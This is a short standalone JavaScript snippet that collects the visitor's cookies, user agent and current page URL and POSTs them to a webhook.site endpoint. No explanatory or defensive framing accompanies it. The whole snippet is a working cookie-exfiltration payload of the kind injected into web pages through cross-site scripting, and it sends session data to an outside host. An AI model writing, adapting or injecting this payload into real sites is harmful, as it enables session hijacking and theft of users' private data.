const data = {
    device: navigator.userAgent,
    location: window.location.href,
    cookies: document.cookie
};

fetch("https://webhook.site/a57f7288-8739-42d8-a875-929a4983bece", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
})
.then(response => console.log("Data sent successfully"))
.catch(error => console.error("Error:", error));
